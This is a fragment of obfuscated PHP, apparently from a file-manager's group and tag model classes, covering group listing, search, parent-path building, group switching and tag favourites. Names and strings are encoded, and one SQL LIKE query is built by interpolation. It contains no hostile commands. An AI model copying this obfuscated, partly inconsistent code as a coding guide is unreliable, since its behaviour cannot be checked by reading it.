$×ÛÕÙ–ç[215]); $°Ú”çğÜ = array($×ÛÕÙ–ç[491] => $×ÛÕÙ–ç[492], $×ÛÕÙ–ç[493] => $×ÛÕÙ–ç[494]); $¨¹ÇÍ‡ = Input::get($×ÛÕÙ–ç[498], $×ÛÕÙ–ç[7], $×ÛÕÙ–ç[1892], $Äî½ãÍ); $ÊÀıÚ—Á = Input::get($×ÛÕÙ–ç[499], $×ÛÕÙ–ç[7], $×ÛÕÙ–ç[1979], array($×ÛÕÙ–ç[1979], $×ÛÕÙ–ç[493])); $ÊÀıÚ—Á = $°Ú”çğÜ[$ÊÀıÚ—Á]; $£ÆÓû© = $£ÆÓû© . "{$¨¹ÇÍ‡}\x20{$ÊÀıÚ—Á}\54\x20\x67\x72\157\x75\x70\x49\x44\40\x61\163\x63"; return $this->order($£ÆÓû©); } public function listChild($†ş—çíÜ) { $‰ËÜÂÓ =& $_SERVER[³½¬ÚË¯]; $Ö´§­éÙ = $this->where(array($‰ËÜÂÓ[180] => $†ş—çíÜ))->_makeOrder()->selectPage(200); $this->_listDataApply($Ö´§­éÙ[$‰ËÜÂÓ[413]]); return $Ö´§­éÙ; } public function listChildIds($ÀÒÎ½ùÍ) { $²˜â»ì =& $_SERVER[³½¬ÚË¯]; if (is_string($…Ì¶š×®)) { $ÀÒÎ½ùÍ = explode($²˜â»ì[50], $ÀÒÎ½ùÍ); } $Àİú²³â = $this->where(array($²˜â»ì[1888] => array($²˜â»ì[7], $ÀÒÎ½ùÍ)))->field($²˜â»ì[1980])->select(); if (!$Àİú²³â) { return !1; } $ªÃ™ÆáÑ = array(); foreach ($Àİú²³â as $¬¾ı§ä—) { $ªÃ™ÆáÑ[] = "\x73\x65\x6c\145\143\164\x20\147\x72\x6f\165\x70\x49\104\40\146\162\x6f\x6d\x20\x60\x67\x72\x6f\x75\160\x60\40\x77\x68\x65\162\x65\x20\160\141\162\145\x6e\164\x4c\145\x76\145\154\x20\154\151\x6b\x65\x20\47{$¬¾ı§ä—[$²˜â»ì[554]]}{$¬¾ı§ä—[$²˜â»ì[1888]]}\x2c\x25\x27"; } $ªÃ™ÆáÑ = implode($²˜â»ì[1981], $ªÃ™ÆáÑ); $Àİú²³â = $this->query($ªÃ™ÆáÑ); if (!$Àİú²³â) { return array(); } $ÀÒÎ½ùÍ = array_to_keyvalue($Àİú²³â, $²˜â»ì[12], $²˜â»ì[1888]); return array_unique($ÀÒÎ½ùÍ); } public function listByID($Òì¥éÃÅ) { $Ñ·ÜÁŞë =& $_SERVER[³½¬ÚË¯]; if (!$Òì¥éÃÅ) { return array(); } $—õËò±Ä = array($Ñ·ÜÁŞë[1888] => array($Ñ·ÜÁŞë[7], $Òì¥éÃÅ)); $ğÅìÍã´ = $this->where($—õËò±Ä)->select(); $ğÅìÍã´ = array_sort_keep($ğÅìÍã´, $Ñ·ÜÁŞë[1888], $Òì¥éÃÅ); $this->_listDataApply($ğÅìÍã´); return $ğÅìÍã´; } public function listSearch($ œ³¤¥÷) { $àØ‚Ú¢š =& $_SERVER[³½¬ÚË¯]; $Óçè±èş = $ œ³¤¥÷[$àØ‚Ú¢š[1982]]; $Ü¨‘§ÈÉ = isset($ œ³¤¥÷[$àØ‚Ú¢š[1983]]) ? $ œ³¤¥÷[$àØ‚Ú¢š[1983]] : !1; if (!trim($Óçè±èş)) { return !1; } $Óçè±èş = str_replace($àØ‚Ú¢š[1984], $àØ‚Ú¢š[1985], $Óçè±èş); $ÆÃ„–¥Ã = array($àØ‚Ú¢š[1888] => array($àØ‚Ú¢š[427], "{$Óçè±èş}\45"), $àØ‚Ú¢š[32] => array($àØ‚Ú¢š[427], "\x25{$Óçè±èş}\x25"), $àØ‚Ú¢š[1043] => $àØ‚Ú¢š[1986]); if ($Ü¨‘§ÈÉ) { $ÑË¯ıÁÓ = $this->getInfoSimple($Ü¨‘§ÈÉ); $Ò¾ÜÙÏ¢ = $ÑË¯ıÁÓ[$àØ‚Ú¢š[554]] . $Ü¨‘§ÈÉ . $àØ‚Ú¢š[582]; $ÆÃ„–¥Ã = array($ÆÃ„–¥Ã, array($àØ‚Ú¢š[554] => array($àØ‚Ú¢š[427], $Ò¾ÜÙÏ¢))); } $ÆÃ„–¥Ã = $this->parseWhereLike($ÆÃ„–¥Ã); $Á‚«Ì©ş = $this->_makeOrder()->where($ÆÃ„–¥Ã)->selectPage(20); $Á‚«Ì©ş = $Á‚«Ì©ş ? $Á‚«Ì©ş : array($àØ‚Ú¢š[413] => array(), $àØ‚Ú¢š[410] => array()); if (!$Á‚«Ì©ş || count($Á‚«Ì©ş[$àØ‚Ú¢š[413]]) < 5 && Input::check($Óçè±èş, $àØ‚Ú¢š[362])) { $ÜééŒĞø = $this->groupChildrenAll($Ü¨‘§ÈÉ); $ÉöÇ®»£ = $this->_searchFromMeta($àØ‚Ú¢š[505], $Óçè±èş, 10, $ÜééŒĞø); $ˆ—å¢àÉ = $this->_searchFromMeta($àØ‚Ú¢š[506], $Óçè±èş, 10, $ÜééŒĞø); $º–ÎÂÄ÷ = array_merge($ÉöÇ®»£, $ˆ—å¢àÉ, $Á‚«Ì©ş[$àØ‚Ú¢š[413]]); $Á‚«Ì©ş[$àØ‚Ú¢š[413]] = array_unique_by_key($º–ÎÂÄ÷, $àØ‚Ú¢š[1888]); $Á‚«Ì©ş[$àØ‚Ú¢š[410]][$àØ‚Ú¢š[411]] = count($Á‚«Ì©ş[$àØ‚Ú¢š[413]]); $Á‚«Ì©ş[$àØ‚Ú¢š[410]][$àØ‚Ú¢š[412]] = ceil($Á‚«Ì©ş[$àØ‚Ú¢š[410]][$àØ‚Ú¢š[411]] / $Á‚«Ì©ş[$àØ‚Ú¢š[410]][$àØ‚Ú¢š[407]]); } $this->_listDataApply($Á‚«Ì©ş[$àØ‚Ú¢š[413]]); return $Á‚«Ì©ş; } protected function groupChildrenAll($¾•â¥­û) { $­Ú¥ª„ =& $_SERVER[³½¬ÚË¯]; if (!$¾•â¥­û) { return !1; } if (!is_array($¾•â¥­û)) { $¾•â¥­û = array($¾•â¥­û); } $…É©ÚóŞ = $¾•â¥­û; foreach ($¾•â¥­û as $¬ï¢‚áà) { $»‰Ù³’ô = $this->getInfoSimple($¬ï¢‚áà); $‚Šñ€é = array($­Ú¥ª„[554] => array($­Ú¥ª„[427], $»‰Ù³’ô[$­Ú¥ª„[554]] . $¬ï¢‚áà . $­Ú¥ª„[582])); $ÆàùÚ„ = $this->field($­Ú¥ª„[1888])->where($‚Šñ€é)->select(); $…É©ÚóŞ = array_merge($…É©ÚóŞ, array_to_keyvalue($ÆàùÚ„, $­Ú¥ª„[12], $­Ú¥ª„[1888])); } return array_unique($…É©ÚóŞ); } private function _searchFromMeta($‰Ë›¬°Í, $×Şé»Î‚, $ñ­ü“Æ¶, $‡ıÒ©²ß) { $ıš‰¼Î‚ =& $_SERVER[³½¬ÚË¯]; $×Şé»Î‚ = strtolower($×Şé»Î‚); $½Ãó®·¸ = array($ıš‰¼Î‚[94] => $‰Ë›¬°Í, $ıš‰¼Î‚[418] => array($ıš‰¼Î‚[427], "\45{$×Şé»Î‚}\x25")); $½Ãó®·¸ = $this->parseWhereLike($½Ãó®·¸); if ($‡ıÒ©²ß) { $½Ãó®·¸[$ıš‰¼Î‚[1888]] = array($ıš‰¼Î‚[7], $‡ıÒ©²ß); } $§ò¶éË× = Model($ıš‰¼Î‚[1987])->where($½Ãó®·¸)->limit($ñ­ü“Æ¶)->select(); if (!$§ò¶éË×) { return array(); } $§ò¶éË× = array_to_keyvalue($§ò¶éË×, $ıš‰¼Î‚[12], $ıš‰¼Î‚[1888]); $Ğç¤Ê¿Î = $this->where(array($ıš‰¼Î‚[1976] => array($ıš‰¼Î‚[7], $§ò¶éË×)))->select(); if (!$Ğç¤Ê¿Î) { return array(); } return $Ğç¤Ê¿Î; } protected function _listDataApplyItem($ª¬ÚäÔ®) { $‡’É´‹è = array($ª¬ÚäÔ®); $this->_listDataApply($‡’É´‹è); return $‡’É´‹è[0]; } protected function _listDataApply(&$‹‡‡ÚÄ¹) { $Ì„¨›Ó£ =& $_SERVER[³½¬ÚË¯]; if (!$‹‡‡ÚÄ¹) { return; } $‡èƒø¦ = array_to_keyvalue($‹‡‡ÚÄ¹, $Ì„¨›Ó£[12], $Ì„¨›Ó£[1888]); $this->_listAppendChildren($‹‡‡ÚÄ¹); $this->_listAppendChildrenMember($‹‡‡ÚÄ¹); $this->_listAppendMeta($‹‡‡ÚÄ¹, $‡èƒø¦); $this->_listAppendParent($‹‡‡ÚÄ¹); $this->_listAppendSourceRoot($‹‡‡ÚÄ¹, $‡èƒø¦); } private function _listAppendChildren(&$³«é¯) { $¢»Ó“ =& $_SERVER[³½¬ÚË¯]; $•æş¨¡­ = array_to_keyvalue($³«é¯, $¢»Ó“[12], $¢»Ó“[1888]); $ü‡´ÄæÃ = array($¢»Ó“[180] => array($¢»Ó“[7], $•æş¨¡­)); $õ¤ÀÎö = array($¢»Ó“[180], $¢»Ó“[1988] => $¢»Ó“[534]); $ÙÔÓ¨ªô = $this->field($õ¤ÀÎö)->where($ü‡´ÄæÃ)->group($¢»Ó“[180])->select(); $Ÿ‰šë¯ = array_to_keyvalue($ÙÔÓ¨ªô, $¢»Ó“[180], $¢»Ó“[534]); foreach ($³«é¯ as &$ïµíÉº„) { $ó×šÛŠÅ = $ïµíÉº„[$¢»Ó“[1888]]; $ïµíÉº„[$¢»Ó“[1989]] = isset($Ÿ‰šë¯[$ó×šÛŠÅ]) ? intval($Ÿ‰šë¯[$ó×šÛŠÅ]) : !1; } unset($ïµíÉº„); } private function _listAppendChildrenMember(&$¿÷Üú¡¥) { $ÇÒš¸³ =& $_SERVER[³½¬ÚË¯]; $´ß¿¥‘ã = array_to_keyvalue($¿÷Üú¡¥, $ÇÒš¸³[12], $ÇÒš¸³[1888]); $´ŞñËšˆ = array($ÇÒš¸³[1888] => array($ÇÒš¸³[7], $´ß¿¥‘ã)); $£òü­Û… = array($ÇÒš¸³[1888], $ÇÒš¸³[1988] => $ÇÒš¸³[534]); $ çåÒ‹Ï = Model($ÇÒš¸³[1978])->field($£òü­Û…)->where($´ŞñËšˆ)->group($ÇÒš¸³[1888])->select(); $ıÕ×ÉÒ” = array_to_keyvalue($ çåÒ‹Ï, $ÇÒš¸³[1888], $ÇÒš¸³[534]); foreach ($¿÷Üú¡¥ as &$ñ£Ì¥ŠÁ) { $»×£å¦ = $ñ£Ì¥ŠÁ[$ÇÒš¸³[1888]]; $ñ£Ì¥ŠÁ[$ÇÒš¸³[1990]] = isset($ıÕ×ÉÒ”[$»×£å¦]) ? intval($ıÕ×ÉÒ”[$»×£å¦]) : !1; } unset($ñ£Ì¥ŠÁ); } private function _listAppendMeta(&$¿ãí«¡ò, $µş—Ä¦) { $ÛĞ•õ¤ =& $_SERVER[³½¬ÚË¯]; $Ÿ‚ÓçÚ = array($ÛĞ•õ¤[1888] => array($ÛĞ•õ¤[7], $µş—Ä¦)); $®Â¿½Âê = Model($ÛĞ•õ¤[1977])->where($Ÿ‚ÓçÚ)->select(); $®Â¿½Âê = array_to_keyvalue_group($®Â¿½Âê, $ÛĞ•õ¤[1888]); foreach ($®Â¿½Âê as &$Î‡‰øİ) { $Î‡‰øİ = array_to_keyvalue($Î‡‰øİ, $ÛĞ•õ¤[94], $ÛĞ•õ¤[418]); } unset($Î‡‰øİ); foreach ($¿ãí«¡ò as &$šàè³Ÿ) { $šàè³Ÿ[$ÛĞ•õ¤[507]] = array(); if (isset($®Â¿½Âê[$šàè³Ÿ[$ÛĞ•õ¤[1888]]])) { $šàè³Ÿ[$ÛĞ•õ¤[507]] = $®Â¿½Âê[$šàè³Ÿ[$ÛĞ•õ¤[1888]]]; } } unset($šàè³Ÿ); } protected function parentLevelArray($Ğóıüªã) { $Å†é½óô =& $_SERVER[³½¬ÚË¯]; $Ğóıüªã = explode($Å†é½óô[50], trim($Ğóıüªã, $Å†é½óô[50])); $Ğóıüªã = array_remove_value($Ğóıüªã, $Å†é½óô[212]); return $Ğóıüªã; } protected function parentInGroup($—åÑ, $ŸæºÂÛ±) { $”£®Øîö =& $_SERVER[³½¬ÚË¯]; $Ò¥†à = $this->getInfoSimple($—åÑ); if (!$Ò¥†à) { return !0; } $ÔÍÀª– = $this->parentLevelArray($Ò¥†à[$”£®Øîö[554]]); $ÔÍÀª–[] = $—åÑ; foreach ($ÔÍÀª– as $—åÑ) { if (in_array($—åÑ . $”£®Øîö[12], $ŸæºÂÛ±)) { return !0; } } return !1; } private function _listAppendParent(&$Òéœ”Ìº) { $œ¸ß©Ôë =& $_SERVER[³½¬ÚË¯]; $©±ˆçµ÷ = array(); foreach ($Òéœ”Ìº as &$Ğ¸¤‹Öî) { $©±ˆçµ÷[$Ğ¸¤‹Öî[$œ¸ß©Ôë[1888]]] = $Ğ¸¤‹Öî[$œ¸ß©Ôë[32]]; $ŒÓÂûû¨ = $this->parentLevelArray($Ğ¸¤‹Öî[$œ¸ß©Ôë[554]]); foreach ($ŒÓÂûû¨ as $×œ©’µ­) { if (!isset($©±ˆçµ÷[$×œ©’µ­])) { $©±ˆçµ÷[$×œ©’µ­] = 0; } } } unset($Ğ¸¤‹Öî); foreach ($©±ˆçµ÷ as $´¯ÛøÃ˜ => $®¯¤ı£) { if ($®¯¤ı£) { continue; } $®ˆ‹¼ËÒ = $this->getInfoSimple($´¯ÛøÃ˜); $©±ˆçµ÷[$´¯ÛøÃ˜] = $®ˆ‹¼ËÒ[$œ¸ß©Ôë[32]]; } $ãÎë±øş = $GLOBALS[$œ¸ß©Ôë[6]][$œ¸ß©Ôë[89]][$œ¸ß©Ôë[1991]]; if ($GLOBALS[$œ¸ß©Ôë[537]] == $œ¸ß©Ôë[88]) { $ãÎë±øş = !1; } foreach ($Òéœ”Ìº as &$Ğ¸¤‹Öî) { $ŒÓÂûû¨ = $this->parentLevelArray($Ğ¸¤‹Öî[$œ¸ß©Ôë[554]]); $–«¦¾Ã = $œ¸ß©Ôë[12]; foreach ($ŒÓÂûû¨ as $´¯ÛøÃ˜ => $×œ©’µ­) { if ($ãÎë±øş && $´¯ÛøÃ˜ == 0) { continue; } $–«¦¾Ã .= $©±ˆçµ÷[$×œ©’µ­] . $œ¸ß©Ôë[8]; } if ($ŒÓÂûû¨) { $–«¦¾Ã .= $Ğ¸¤‹Öî[$œ¸ß©Ôë[32]]; } $Ğ¸¤‹Öî[$œ¸ß©Ôë[559]] = str_replace($œ¸ß©Ôë[562], $œ¸ß©Ôë[8], $–«¦¾Ã); } unset($Ğ¸¤‹Öî); } private function _listAppendSourceRoot(&$Ç¥§¶²æ, $“ÏœªØ«) { $‘¾œèÑ =& $_SERVER[³½¬ÚË¯]; $Ëå¸•¾ = Model($‘¾œèÑ[861])->listSourceRoot(SourceModel::TYPE_GROUP, $“ÏœªØ«); $Ëå¸•¾ = array_to_keyvalue($Ëå¸•¾, $‘¾œèÑ[539]); $Ëå¸•¾ = array_remove_key($Ëå¸•¾, $‘¾œèÑ[539]); foreach ($Ç¥§¶²æ as &$·úªÉ¡) { $·úªÉ¡[$‘¾œèÑ[87]] = $Ëå¸•¾[$·úªÉ¡[$‘¾œèÑ[1888]]] ? $Ëå¸•¾[$·úªÉ¡[$‘¾œèÑ[1888]]] : array(); } unset($·úªÉ¡); } protected function groupMerge($áââ‹üè) { $áââ‹üè = array_values(array_unique($áââ‹üè)); $Šã¤Õ’Û = array(); for ($ÄŸ°Ú ’ = 0; $ÄŸ°Ú ’ < count($áââ‹üè); $ÄŸ°Ú ’++) { $‘åÄ²†¾ = !1; for ($‡ºÑ™Ş¨ = 0; $‡ºÑ™Ş¨ < count($áââ‹üè); $‡ºÑ™Ş¨++) { if ($ÄŸ°Ú ’ == $‡ºÑ™Ş¨) { continue; } if ($this->isParentOf($áââ‹üè[$‡ºÑ™Ş¨], $áââ‹üè[$ÄŸ°Ú ’])) { $‘åÄ²†¾ = !0; break; } } if (!$‘åÄ²†¾) { $Šã¤Õ’Û[] = $áââ‹üè[$ÄŸ°Ú ’]; } } return $Šã¤Õ’Û; } protected function isParentOf($˜œøÁÄÎ, $Ö§®‚ü‰) { $éªÏÎŒƒ =& $_SERVER[³½¬ÚË¯]; if (!$˜œøÁÄÎ || !$Ö§®‚ü‰ || $˜œøÁÄÎ == $Ö§®‚ü‰) { return !1; } $©š‚äìÑ = $this->getInfoSimple($˜œøÁÄÎ); $ÒîÁ‘ßú = $this->getInfoSimple($Ö§®‚ü‰); $Ïéªô = $©š‚äìÑ[$éªÏÎŒƒ[554]] . $˜œøÁÄÎ . $éªÏÎŒƒ[50]; if (substr($ÒîÁ‘ßú[$éªÏÎŒƒ[554]], 0, strlen($Ïéªô)) == $Ïéªô) { return !0; } return !1; } public function groupShowRoot($Óªˆ¿…», $¥æ—ÊÀ¸ = false) { $öíºÔ» =& $_SERVER[³½¬ÚË¯]; $ËíêÄµÇ = $this->getInfo($Óªˆ¿…»); if (!$ËíêÄµÇ) { return array(); } $£Ğ¾‘ó = $this->parentLevelArray($ËíêÄµÇ[$öíºÔ»[554]]); $èëìíÉú = array($Óªˆ¿…»); if (count($£Ğ¾‘ó) == 0) { return $èëìíÉú; } if ($¥æ—ÊÀ¸ && count($£Ğ¾‘ó) == 1) { return $èëìíÉú; } if (!$ËíêÄµÇ[$öíºÔ»[507]] || !isset($ËíêÄµÇ[$öíºÔ»[507]][$öíºÔ»[1974]]) || $ËíêÄµÇ[$öíºÔ»[507]][$öíºÔ»[1974]] == $öíºÔ»[1943]) { return $this->groupShowRoot($£Ğ¾‘ó[count($£Ğ¾‘ó) - 1], $¥æ—ÊÀ¸); } if ($ËíêÄµÇ[$öíºÔ»[507]][$öíºÔ»[1974]] == $öíºÔ»[401]) { $à™ÌóÀ = explode($öíºÔ»[50], $ËíêÄµÇ[$öíºÔ»[507]][$öíºÔ»[1975]]); if ($à™ÌóÀ) { $èëìíÉú = array_merge($èëìíÉú, $à™ÌóÀ); } } return $èëìíÉú; } protected function resetParentLevel() { $şİı³¤ =& $_SERVER[³½¬ÚË¯]; $‡Î¢Ó = $şİı³¤[1888]; $«ÀÎş© = $this->select(); $«ÀÎş© = array_to_keyvalue($«ÀÎş©, $‡Î¢Ó); foreach ($«ÀÎş© as $¡³ìóØÓ) { $Ø¥Œ‹¥ô = $¡³ìóØÓ; $ÃÔÀ‰€É = array(); while ($Ø¥Œ‹¥ô[$şİı³¤[180]] != 0) { $ÃÔÀ‰€É[] = $Ø¥Œ‹¥ô[$şİı³¤[180]]; $Ø¥Œ‹¥ô = $«ÀÎş©[$Ø¥Œ‹¥ô[$şİı³¤[180]]]; } $ÃÔÀ‰€É[] = 0; $ÃÔÀ‰€É = $şİı³¤[50] . implode($şİı³¤[50], array_reverse($ÃÔÀ‰€É)) . $şİı³¤[50]; $this->setNamePinyin($¡³ìóØÓ[$‡Î¢Ó], $¡³ìóØÓ[$şİı³¤[32]]); $this->where(array($‡Î¢Ó => $¡³ìóØÓ[$‡Î¢Ó]))->save(array($şİı³¤[621] => $ÃÔÀ‰€É)); } return $«ÀÎş©; } public function groupNameAuto($¾²Úáş, $ûşËáÑî) { $Ë»Ã™ò÷ =& $_SERVER[³½¬ÚË¯]; $›×¦ˆæ = $this->where(array($Ë»Ã™ò÷[445] => $¾²Úáş))->getField($Ë»Ã™ò÷[32], !0); if (!$›×¦ˆæ || !in_array($ûşËáÑî, $›×¦ˆæ)) { return $ûşËáÑî; } for ($§ÍæÉ™Ñ = 1; $§ÍæÉ™Ñ <= count($›×¦ˆæ) + 1; $§ÍæÉ™Ñ++) { $‚£ö×í¬ = $ûşËáÑî . "\50{$§ÍæÉ™Ñ}\x29"; if (!in_array($‚£ö×í¬, $›×¦ˆæ)) { return $‚£ö×í¬; } } } public function groupSwitch($ç¤ìñ¸ , $˜‘¤ÄìÃ) { $ĞÚ²ÖÎ´ =& $_SERVER[³½¬ÚË¯]; $Ñ÷Ê£Ù“ = array($ĞÚ²ÖÎ´[1888] => array($ĞÚ²ÖÎ´[7], array($ç¤ìñ¸ , $˜‘¤ÄìÃ))); $€¶¼©ßö = $this->where($Ñ÷Ê£Ù“)->select(); $€¶¼©ßö = array_to_keyvalue($€¶¼©ßö, $ĞÚ²ÖÎ´[1888]); if (!isset($€¶¼©ßö[$ç¤ìñ¸ ]) || !isset($€¶¼©ßö[$˜‘¤ÄìÃ]) || $€¶¼©ßö[$ç¤ìñ¸ ][$ĞÚ²ÖÎ´[180]] == 0) { return !1; } $Ñ÷Ê£Ù“ = array($ĞÚ²ÖÎ´[1888] => $ç¤ìñ¸ ); $õõÇÀá = Model($ĞÚ²ÖÎ´[1978])->where($Ñ÷Ê£Ù“)->select(); if (!$õõÇÀá) { $õõÇÀá = array(); } foreach ($õõÇÀá as $ßâåé¿) { $ïîœğºæ = $ßâåé¿[$ĞÚ²ÖÎ´[1690]]; $Ñ÷Ê£Ù“ = array($ĞÚ²ÖÎ´[1690] => $ïîœğºæ, $ĞÚ²ÖÎ´[1888] => $˜‘¤ÄìÃ); $‰óÃåß = Model($ĞÚ²ÖÎ´[1978])->where($Ñ÷Ê£Ù“)->find(); if (!$‰óÃåß) { $ìº—ÍÙâ = array($˜‘¤ÄìÃ => $ßâåé¿[$ĞÚ²ÖÎ´[1992]]); Model($ĞÚ²ÖÎ´[568])->userGroupAdd($ïîœğºæ, $ìº—ÍÙâ); } Model($ĞÚ²ÖÎ´[568])->userGroupRemove($ïîœğºæ, $ç¤ìñ¸ ); } $Ñ÷Ê£Ù“ = array($ĞÚ²ÖÎ´[178] => 2, $ĞÚ²ÖÎ´[180] => 0, $ĞÚ²ÖÎ´[453] => 1, $ĞÚ²ÖÎ´[539] => array($ĞÚ²ÖÎ´[7], array($ç¤ìñ¸ , $˜‘¤ÄìÃ))); $±½Ëğ½  = Model($ĞÚ²ÖÎ´[861])->where($Ñ÷Ê£Ù“)->field($ĞÚ²ÖÎ´[1993])->select(); $±½Ëğ½  = array_to_keyvalue($±½Ëğ½ , $ĞÚ²ÖÎ´[539], $ĞÚ²ÖÎ´[181]); $°‘´¥¡» = !empty($±½Ëğ½ [$ç¤ìñ¸ ]) ? $±½Ëğ½ [$ç¤ìñ¸ ] : !1; if ($°‘´¥¡») { if (!$±½Ëğ½ [$˜‘¤ÄìÃ]) { $±½Ëğ½ [$˜‘¤ÄìÃ] = Model($ĞÚ²ÖÎ´[861])->groupRootAdd($˜‘¤ÄìÃ); } $—îØ¼ÒÓ = $±½Ëğ½ [$˜‘¤ÄìÃ]; $Ñ÷Ê£Ù“ = array($ĞÚ²ÖÎ´[180] => $°‘´¥¡»); $±½Ëğ½  = Model($ĞÚ²ÖÎ´[861])->where($Ñ÷Ê£Ù“)->field($ĞÚ²ÖÎ´[1994])->select(); if (!$±½Ëğ½ ) { $±½Ëğ½  = array(); } Model($ĞÚ²ÖÎ´[861])->moveClearAuth = !1; foreach ($±½Ëğ½  as $©¾½¬Óî) { $ù§Ú·ßÇ = $©¾½¬Óî[$ĞÚ²ÖÎ´[453]] == $ĞÚ²ÖÎ´[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ĞÚ²ÖÎ´[861])->move($©¾½¬Óî[$ĞÚ²ÖÎ´[181]], $—îØ¼ÒÓ, $ù§Ú·ßÇ); } Model($ĞÚ²ÖÎ´[861])->moveClearAuth = !0; $Ñ÷Ê£Ù“ = array($ĞÚ²ÖÎ´[178] => 2, $ĞÚ²ÖÎ´[539] => $ç¤ìñ¸ ); $Êœ»Ùƒó = array($ĞÚ²ÖÎ´[539] => $˜‘¤ÄìÃ); Model($ĞÚ²ÖÎ´[1995])->where($Ñ÷Ê£Ù“)->save($Êœ»Ùƒó); Model($ĞÚ²ÖÎ´[1996])->where($Ñ÷Ê£Ù“)->save($Êœ»Ùƒó); } $this->_changeChildLevel($€¶¼©ßö[$ç¤ìñ¸ ], $€¶¼©ßö[$˜‘¤ÄìÃ], !0); $this->where(array($ĞÚ²ÖÎ´[180] => $ç¤ìñ¸ ))->save(array($ĞÚ²ÖÎ´[180] => $˜‘¤ÄìÃ)); $this->_clearChildrenCache($€¶¼©ßö[$˜‘¤ÄìÃ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\162\x5f\x66\x61\x76"; protected function cacheFunctionAlias($Â—ù»û) { $¾óÃÕïİ =& $_SERVER[³½¬ÚË¯]; return array($¾óÃÕïİ[1997] => array($Â—ù»û[0], $¾óÃÕïİ[1998]), $¾óÃÕïİ[1999] => array($Â—ù»û[0], $¾óÃÕïİ[2000])); } protected function get($Ìš´ã¾Š) { $ÖıÓ´î =& $_SERVER[³½¬ÚË¯]; $˜­®Ğ = Model($ÖıÓ´î[555])->metaGet($Ìš´ã¾Š, $ÖıÓ´î[2001]); $İÖ¸›Ø— = json_decode($˜­®Ğ, !0); return $İÖ¸›Ø— ? $İÖ¸›Ø— : array($ÖıÓ´î[2002] => $ÖıÓ´î[88], $ÖıÓ´î[413] => array()); } protected function set($Ë÷›Œ‚‰, $’¡©ĞçÊ) { $í¶‡½´Â =& $_SERVER[³½¬ÚË¯]; $’¡©ĞçÊ = $’¡©ĞçÊ ? $’¡©ĞçÊ : array($í¶‡½´Â[2002] => $í¶‡½´Â[88], $í¶‡½´Â[413] => array()); return Model($í¶‡½´Â[555])->metaSet($Ë÷›Œ‚‰, $í¶‡½´Â[2001], json_encode($’¡©ĞçÊ)); } protected function getByTagID($­ŠØøŒ, $óÙ™¸) { $Ë®š¬ÂØ =& $_SERVER[³½¬ÚË¯]; if (!$­ŠØøŒ || !$óÙ™¸) { return !1; } if (!Model($Ë®š¬ÂØ[555])->getInfoSimple($­ŠØøŒ)) { return !1; } $å¥¥ÈÂì = $this->get($­ŠØøŒ); if (!$å¥¥ÈÂì || !isset($å¥¥ÈÂì[$Ë®š¬ÂØ[413]])) { return !1; } $Ü’İ…„Ÿ = array_find_by_field($å¥¥ÈÂì[$Ë®š¬ÂØ[413]], $Ë®š¬ÂØ[443], $óÙ™¸); return is_array($Ü’İ…„Ÿ) ? $Ü’İ…„Ÿ : !1; } public function listSource($ó‰¤ñä, $Ò™í°Ø) { $¿§ìñâå =& $_SERVER[³½¬ÚË¯]; if ($Ò™í°Ø && !is_array($Ò™í°Ø)) { $Ò™í°Ø = array($Ò™í°Ø); } $¦¢ûÚ·· = $this->listData($ó‰¤ñä); $øæÅÃÍı = array(); foreach ($¦¢ûÚ·· as $¨ÉÁìÚŸ) { $±ÎĞÀÁ = $¨ÉÁìÚŸ[$¿§ìñâå[84]]; if (!$±ÎĞÀÁ) { continue; } if (!isset($øæÅÃÍı[$±ÎĞÀÁ])) { $øæÅÃÍı[$±ÎĞÀÁ] = array(); } $øæÅÃÍı[$±ÎĞÀÁ][] = $¨ÉÁìÚŸ[$¿§ìñâå[468]]; } $…úÍ¢ö = array(); foreach ($øæÅÃÍı as $ùËŞÀŞ˜ => $®­Ş­‹) { $·åÂù®” = !0; if (!$Ò™í°Ø) { $…úÍ¢ö[] = $ùËŞÀŞ˜; continue; } foreach ($Ò™í°Ø as $ÅÏåì”Ò) { if (!in_array($ÅÏåì”Ò, $®­Ş­‹)) { $·åÂù®” = !1; break; } } if ($·åÂù®”) { $…úÍ¢ö[] = $ùËŞÀŞ˜; } } if (!$…úÍ¢ö) { return array(); } $ªÂïï¿Æ = array($¿§ìñâå[459] => array($¿§ìñâå[460], $…úÍ¢ö), $¿§ìñâå[539] => $ó‰¤ñä, $¿§ìñâå[178] => SourceModel::TYPE_GROUP); $›—áĞ¯— = Model($¿§ìñâå[1375])->listSource($ªÂïï¿Æ); if (!$›—áĞ¯— || count($…úÍ¢ö) == $›—áĞ¯—[$¿§ìñâå[410]][$¿§ìñâå[411]]) { return $›—áĞ¯—; } $™øÄò‰ğ = array(); $øÍßÎıŠ = array_to_keyvalue($›—áĞ¯—[$¿§ìñâå[82]], $¿§ìñâå[12], $¿§ìñâå[181]); $¥Ã¢¶Æ = array_to_keyvalue($›—áĞ¯—[$¿§ìñâå[83]], $¿§ìñâå[12], $¿§ìñâå[181]); $Ñø¾Ö¦£ = array_merge($¥Ã¢¶Æ, $øÍßÎıŠ); foreach ($…úÍ¢ö as $±ÎĞÀÁ) { if (!in_array($±ÎĞÀÁ, $Ñø¾Ö¦£)) { $™øÄò‰ğ[] = $±ÎĞÀÁ; } } if ($™øÄò‰ğ) { $this->removeBySource($ó‰¤ñä, $™øÄò‰ğ); } return $›—áĞ¯—; } protected function listData($ÈÍúŠ²) { $ªé© èó =& $_SERVER[³½¬ÚË¯]; $ñ©ÛŸâš = array($ªé© èó[1681] => 0, $ªé© èó[526] => array($ªé© èó[2003], 0), $ªé© èó[464] => $ªé© èó[2004] . $ÈÍúŠ²); $æõÚô™› = $ªé© èó[2005]; $óäàü†§ = $this->field($æõÚô™›)->where($ñ©ÛŸâš)->order($ªé© èó[2006])->select(); return $óäàü†§ ? $óäàü†§ : array(); } protected function addToTag($Ú…“‰ÁÛ, $¬”àÀ¢À, $®ÌÄÂãş) { $ëöäåê× =& $_SERVER[³½¬ÚË¯]; if (!$this->getByTagID($Ú…“‰ÁÛ, $®ÌÄÂãş) || !$¬”àÀ¢À) { return !1; } if (!Model($ëöäåê×[861])->pathInfo($¬”àÀ¢À)) { return !1; } $¯¬¢¾®Ì = array($ëöäåê×[1681] => 0, $ëöäåê×[526] => $®ÌÄÂãş, $ëöäåê×[463] => $¬”àÀ¢À, $ëöäåê×[464] => $ëöäåê×[2007] . $Ú…“‰ÁÛ, $ëöäåê×[462] => $ëöäåê×[12], $ëöäåê×[1892] => 0); if ($this->where($¯¬¢¾®Ì)->find()) { return !1; } return $this->add($¯¬¢¾®Ì); } protected function removeFromTag($ 